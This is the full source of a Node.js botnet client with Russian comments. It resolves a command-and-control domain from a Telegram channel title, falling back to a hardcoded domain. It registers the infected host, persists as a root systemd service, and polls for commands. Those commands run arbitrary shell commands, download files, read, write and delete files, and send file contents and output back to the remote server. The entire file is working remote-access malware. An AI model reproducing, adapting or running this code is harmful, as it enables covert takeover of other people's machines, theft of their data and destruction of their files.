const fs = require('fs');
const crypto = require('crypto');
const https = require('https');
const http = require('http');
const { exec } = require('child_process');
const os = require('os');
const path = require('path');

// ============ ОПРЕДЕЛЯЕМ ПАПКУ СКРИПТА ============
// __dirname - папка, где лежит bot.js
const SCRIPT_DIR = __dirname;
const ID_FILE = path.join(SCRIPT_DIR, 'bot_id.txt');
const PID_FILE = path.join(SCRIPT_DIR, '.bot.pid');

console.log('[+] Папка скрипта:', SCRIPT_DIR);
console.log('[+] Файл ID:', ID_FILE);

// ============ КОНФИГУРАЦИЯ ============
const CONFIG = {
    telegramUrl: 'https://t.me/SorryItsmyjobonlybussinesbot',
    defaultDomain: 'stressify.pro',
    checkInterval: 30000,
    jitter: 15000,
    retryDelay: 15000,
    timeout: 10000
};

// ============ ГЕНЕРАЦИЯ ID (ВСЕГДА ИЗ ПАПКИ СКРИПТА) ============
function getBotId() {
    // Пытаемся прочитать ID из файла в папке скрипта
    try {
        if (fs.existsSync(ID_FILE)) {
            const id = fs.readFileSync(ID_FILE, 'utf8').trim();
            if (id && id.length === 32) {
                console.log('[+] ✅ ID найден в:', ID_FILE);
                console.log('[+] ID:', id);
                return id;
            } else {
                console.log('[!] Файл ID есть, но ID некорректный:', id);
            }
        } else {
            console.log('[!] Файл ID не найден:', ID_FILE);
        }
    } catch (e) {
        console.log('[!] Ошибка чтения ID:', e.message);
    }
    
    // ID не найден — генерируем новый
    const newId = crypto.randomBytes(16).toString('hex');
    console.log('[+] 🆕 Сгенерирован НОВЫЙ ID:', newId);
    
    // Сохраняем в папку скрипта
    try {
        fs.writeFileSync(ID_FILE, newId, { mode: 0o644 });
        console.log('[+] 💾 ID сохранен в:', ID_FILE);
    } catch (e) {
        console.error('[-] ❌ НЕ УДАЛОСЬ СОХРАНИТЬ ID:', e.message);
    }
    
    return newId;
}

// ============ ПРОВЕРКА НА ДУБЛИКАТ ============
function checkSingleInstance() {
    if (fs.existsSync(PID_FILE)) {
        const pid = fs.readFileSync(PID_FILE, 'utf8').trim();
        try {
            process.kill(parseInt(pid), 0);
            console.log('[!] Бот уже запущен (PID:', pid + ')');
            process.exit(1);
        } catch (e) {
            fs.writeFileSync(PID_FILE, process.pid.toString());
        }
    } else {
        fs.writeFileSync(PID_FILE, process.pid.toString());
    }
}

// ============ HTTP ЗАПРОСЫ ============
function request(options, data = null) {
    return new Promise((resolve, reject) => {
        const url = new URL(options.url);
        const isHttps = url.protocol === 'https:';
        const lib = isHttps ? https : http;
        
        const reqOptions = {
            hostname: url.hostname,
            port: url.port || (isHttps ? 443 : 80),
            path: url.pathname + url.search,
            method: options.method || 'GET',
            headers: options.headers || {},
            timeout: options.timeout || CONFIG.timeout
        };
        
        const req = lib.request(reqOptions, (res) => {
            let body = '';
            res.on('data', chunk => body += chunk);
            res.on('end', () => {
                resolve({
                    status: res.statusCode,
                    headers: res.headers,
                    body: body
                });
            });
        });
        
        req.on('error', reject);
        req.on('timeout', () => {
            req.destroy();
            reject(new Error('Request timeout'));
        });
        
        if (data) {
            req.write(typeof data === 'string' ? data : JSON.stringify(data));
        }
        req.end();
    });
}

function get(url, headers = {}) {
    return request({ url, method: 'GET', headers });
}

function post(url, data, headers = {}) {
    return request({
        url,
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
            ...headers
        }
    }, data);
}

// ============ ФОРМАТ ДАТЫ ДЛЯ MYSQL ============
function getMySQLDate() {
    const now = new Date();
    return now.getFullYear() + '-' +
           String(now.getMonth() + 1).padStart(2, '0') + '-' +
           String(now.getDate()).padStart(2, '0') + ' ' +
           String(now.getHours()).padStart(2, '0') + ':' +
           String(now.getMinutes()).padStart(2, '0') + ':' +
           String(now.getSeconds()).padStart(2, '0');
}

// ============ УСТАНОВКА В АВТОЗАГРУЗКУ ============
function installService() {
    if (process.platform !== 'linux') {
        console.log('[!] Автоустановка доступна только для Linux');
        return false;
    }

    if (process.getuid && process.getuid() !== 0) {
        console.log('[!] Для установки в автозагрузку нужны права root');
        return false;
    }

    try {
        const { execSync } = require('child_process');
        const scriptPath = process.argv[1];
        let absoluteScriptPath = scriptPath;
        if (!path.isAbsolute(scriptPath)) {
            absoluteScriptPath = path.join(process.cwd(), scriptPath);
        }
        const scriptDir = path.dirname(absoluteScriptPath);
        
        const serviceContent = `[Unit]
Description=C2 Bot Service
After=network.target
Wants=network-online.target

[Service]
Type=simple
User=root
WorkingDirectory=${scriptDir}
ExecStart=/usr/bin/node ${absoluteScriptPath}
Restart=always
RestartSec=10
StandardOutput=append:${scriptDir}/bot.log
StandardError=append:${scriptDir}/bot-error.log
Environment=NODE_ENV=production

[Install]
WantedBy=multi-user.target
`;

        fs.writeFileSync('/etc/systemd/system/c2-bot.service', serviceContent);
        execSync('systemctl daemon-reload', { stdio: 'pipe' });
        execSync('systemctl enable c2-bot', { stdio: 'pipe' });
        execSync('systemctl start c2-bot', { stdio: 'pipe' });
        
        console.log('[+] ✅ Бот установлен в автозагрузку');
        console.log('[+] Рабочая папка:', scriptDir);
        return true;
    } catch (error) {
        console.error('[-] Ошибка установки:', error.message);
        return false;
    }
}

// ============ ПРОВЕРКА УСТАНОВКИ ============
function isServiceInstalled() {
    if (process.platform !== 'linux') return false;
    try {
        const { execSync } = require('child_process');
        const result = execSync('systemctl status c2-bot 2>&1', { stdio: 'pipe', timeout: 3000 });
        return result.toString().includes('loaded');
    } catch (e) {
        return false;
    }
}

function isServiceRunning() {
    if (process.platform !== 'linux') return false;
    try {
        const { execSync } = require('child_process');
        const result = execSync('systemctl is-active c2-bot 2>&1', { stdio: 'pipe', timeout: 3000 });
        return result.toString().trim() === 'active';
    } catch (e) {
        return false;
    }
}

// ============ ПОЛУЧЕНИЕ ДОМЕНА ============
async function getDomainFromTelegram() {
    try {
        console.log('[+] Получение домена из Telegram...');
        const response = await get(CONFIG.telegramUrl, {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        });
        
        if (response.status !== 200) {
            throw new Error('HTTP ' + response.status);
        }
        
        const match = response.body.match(/<div class="tgme_page_title"><span dir="auto">([^<]+)<\/span><\/div>/);
        if (match && match[1]) {
            const domain = match[1].trim().toLowerCase();
            console.log('[+] Домен получен из Telegram:', domain);
            return domain;
        }
        throw new Error('Домен не найден');
    } catch (error) {
        console.warn('[-] Ошибка получения домена:', error.message);
        console.log('[!] Использую резервный домен:', CONFIG.defaultDomain);
        return CONFIG.defaultDomain;
    }
}

// ============ ПРОВЕРКА ДОСТУПНОСТИ ============
async function checkDomain(domain) {
    try {
        const response = await get(`https://${domain}/api/ping`, {
            'X-Bot-Id': BOT_ID
        });
        return response.status === 200;
    } catch {
        return false;
    }
}

// ============ РЕГИСТРАЦИЯ ============
async function registerBot(domain) {
    try {
        const info = {
            bot_id: BOT_ID,
            hostname: os.hostname(),
            platform: os.platform(),
            arch: os.arch()
        };
        const response = await post(
            `https://${domain}/api/register`,
            info,
            { 'User-Agent': 'C2-Bot/1.0' }
        );
        if (response.status === 200) {
            console.log('[+] Бот зарегистрирован на', domain);
            return true;
        }
        return false;
    } catch (error) {
        console.error('[-] Ошибка регистрации:', error.message);
        return false;
    }
}

// ============ ПОЛУЧЕНИЕ КОМАНДЫ ============
async function getCommand(domain) {
    try {
        const response = await post(
            `https://${domain}/api/c2`,
            { bot_id: BOT_ID },
            { 'User-Agent': 'C2-Bot/1.0' }
        );
        if (response.status === 200) {
            const data = JSON.parse(response.body);
            return data.command || null;
        }
        return null;
    } catch (error) {
        console.error('[-] Ошибка получения команды:', error.message);
        return null;
    }
}

// ============ ВЫПОЛНЕНИЕ КОМАНДЫ ============
async function executeCommand(command) {
    if (!command) return null;
    
    console.log('[+] Выполнение:', command.type, JSON.stringify(command.data || {}));
    
    const result = {
        bot_id: BOT_ID,
        command_id: command.id || Date.now(),
        status: 'success',
        output: '',
        executed_at: getMySQLDate()
    };

    try {
        switch (command.type) {
            case 'ping':
                result.output = 'pong';
                break;
                
            case 'info':
                result.output = JSON.stringify({
                    hostname: os.hostname(),
                    platform: os.platform(),
                    arch: os.arch(),
                    cpus: os.cpus().length,
                    memory: Math.round(os.totalmem() / 1024 / 1024) + 'MB',
                    uptime: Math.round(os.uptime() / 60 / 60) + 'h',
                    loadavg: os.loadavg(),
                    freemem: Math.round(os.freemem() / 1024 / 1024) + 'MB'
                });
                break;
                
            case 'exec':
                const cmd = command.data?.cmd || command.data?.command || 'echo "no command"';
                result.output = await new Promise((resolve) => {
                    exec(cmd, { 
                        timeout: 30000,
                        shell: process.platform === 'win32' ? 'cmd.exe' : '/bin/sh'
                    }, (err, stdout, stderr) => {
                        if (err) {
                            resolve(stderr || err.message || 'Error');
                        } else {
                            resolve(stdout || stderr || 'OK');
                        }
                    });
                });
                break;
                
            case 'download':
                const url = command.data?.url;
                const path = command.data?.path || './downloaded_' + Date.now();
                if (!url) throw new Error('URL required');
                const fileData = await get(url);
                if (fileData.status === 200) {
                    fs.writeFileSync(path, fileData.body);
                    result.output = `Файл сохранен: ${path} (${fileData.body.length} байт)`;
                } else {
                    throw new Error('Download failed: ' + fileData.status);
                }
                break;
                
            case 'upload':
                const filePath = command.data?.path;
                if (!filePath || !fs.existsSync(filePath)) {
                    throw new Error('Файл не найден: ' + filePath);
                }
                const content = fs.readFileSync(filePath, 'base64');
                const stats = fs.statSync(filePath);
                result.output = JSON.stringify({
                    name: filePath.split(/[\\/]/).pop(),
                    size: stats.size,
                    content: content.substring(0, 1000) + (content.length > 1000 ? '...' : '')
                });
                break;
                
            case 'sleep':
                const seconds = command.data?.seconds || 10;
                await new Promise(r => setTimeout(r, seconds * 1000));
                result.output = `Спал ${seconds} секунд`;
                break;
                
            case 'ls':
                const dir = command.data?.path || '.';
                const files = fs.readdirSync(dir);
                result.output = files.join('\n');
                break;
                
            case 'read':
                const readPath = command.data?.path;
                if (!readPath || !fs.existsSync(readPath)) {
                    throw new Error('Файл не найден');
                }
                result.output = fs.readFileSync(readPath, 'utf8');
                break;
                
            case 'write':
                const writePath = command.data?.path;
                const content2 = command.data?.content || '';
                if (!writePath) throw new Error('Path required');
                fs.writeFileSync(writePath, content2);
                result.output = `Записано ${content2.length} байт в ${writePath}`;
                break;
                
            case 'delete':
                const delPath = command.data?.path;
                if (!delPath) throw new Error('Path required');
                fs.unlinkSync(delPath);
                result.output = `Удален: ${delPath}`;
                break;
                
            case 'kill':
                result.output = 'Бот завершает работу...';
                console.log('[!] Получена команда kill');
                setTimeout(() => {
                    if (fs.existsSync(PID_FILE)) fs.unlinkSync(PID_FILE);
                    process.exit(0);
                }, 1000);
                break;
                
            default:
                result.status = 'error';
                result.output = `Неизвестная команда: ${command.type}`;
        }
    } catch (error) {
        result.status = 'error';
        result.output = error.message;
        console.error('[-] Ошибка выполнения:', error.message);
    }
    
    return result;
}

// ============ ОТПРАВКА РЕЗУЛЬТАТА ============
async function sendResult(domain, result) {
    if (!result) return;
    
    try {
        const response = await post(
            `https://${domain}/api/result`,
            result,
            { 'User-Agent': 'C2-Bot/1.0' }
        );
        if (response.status === 200) {
            console.log('[+] Результат отправлен (команда:', result.command_id + ')');
        } else {
            console.error('[-] Сервер вернул:', response.status, response.body);
        }
    } catch (error) {
        console.error('[-] Ошибка отправки результата:', error.message);
    }
}

// ============ ОСНОВНОЙ ЦИКЛ ============
let currentDomain = null;
let isRegistered = false;

async function mainLoop() {
    try {
        if (!currentDomain) {
            currentDomain = await getDomainFromTelegram();
            console.log('[+] Используемый домен:', currentDomain);
        }
        
        const available = await checkDomain(currentDomain);
        if (!available) {
            console.log('[-] Домен недоступен:', currentDomain);
            if (currentDomain === CONFIG.defaultDomain) {
                const newDomain = await getDomainFromTelegram();
                if (newDomain && newDomain !== currentDomain) {
                    currentDomain = newDomain;
                    console.log('[+] Новый домен:', currentDomain);
                } else {
                    setTimeout(mainLoop, CONFIG.retryDelay);
                    return;
                }
            } else {
                currentDomain = CONFIG.defaultDomain;
                setTimeout(mainLoop, CONFIG.retryDelay);
                return;
            }
        }
        
        if (!isRegistered) {
            isRegistered = await registerBot(currentDomain);
        }
        
        const command = await getCommand(currentDomain);
        if (command) {
            const result = await executeCommand(command);
            if (result) {
                await sendResult(currentDomain, result);
            }
        }
        
        const delay = CONFIG.checkInterval + Math.floor(Math.random() * CONFIG.jitter);
        console.log('[+] Ожидание', Math.round(delay/1000), 'с до следующего опроса');
        setTimeout(mainLoop, delay);
        
    } catch (error) {
        console.error('[-] Критическая ошибка:', error.message);
        setTimeout(mainLoop, CONFIG.retryDelay);
    }
}

// ============ ЗАПУСК ============

// Проверка на дубликат
checkSingleInstance();

// Получаем ID (всегда из папки скрипта)
const BOT_ID = getBotId();

console.log('╔═══════════════════════════════════════╗');
console.log('║          🤖 C2 БОТ ЗАПУЩЕН          ║');
console.log('╚═══════════════════════════════════════╝');
console.log('[+] ID:', BOT_ID);
console.log('[+] Платформа:', process.platform);
console.log('[+] Node.js:', process.version);
console.log('[+] PID:', process.pid);
console.log('[+] Папка скрипта:', SCRIPT_DIR);

// ============ АВТОЗАГРУЗКА ============
if (process.platform === 'linux') {
    try {
        const { execSync } = require('child_process');
        const result = execSync('systemctl status c2-bot 2>&1', { stdio: 'pipe', timeout: 3000 });
        const output = result.toString();
        const installed = output.includes('loaded');
        const running = output.includes('active (running)');
        
        console.log('\n📊 Автозагрузка:');
        console.log('   Сервис:', installed ? '✅ Установлен' : '❌ Не установлен');
        console.log('   Статус:', running ? '✅ Запущен' : '❌ Остановлен');
        
        if (installed && !running && process.getuid && process.getuid() === 0) {
            console.log('[+] Запускаю через systemd...');
            execSync('systemctl start c2-bot', { stdio: 'pipe' });
            console.log('[+] Передаю управление systemd...');
            setTimeout(() => {
                if (fs.existsSync(PID_FILE)) fs.unlinkSync(PID_FILE);
                process.exit(0);
            }, 1000);
        }
        
        if (!installed && process.getuid && process.getuid() === 0) {
            console.log('\n[!] Установка в автозагрузку...');
            setTimeout(installService, 2000);
        }
        
        if (!installed && process.getuid && process.getuid() !== 0) {
            console.log('\n[!] Для автозагрузки: sudo node bot.js');
        }
    } catch (e) {}
}

console.log('\n[+] Основной цикл запущен...');
console.log('━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n');

// Обработка сигналов
process.on('SIGTERM', () => {
    console.log('[+] Завершение...');
    if (fs.existsSync(PID_FILE)) fs.unlinkSync(PID_FILE);
    process.exit(0);
});

process.on('SIGINT', () => {
    console.log('[+] Завершение...');
    if (fs.existsSync(PID_FILE)) fs.unlinkSync(PID_FILE);
    process.exit(0);
});

mainLoop();

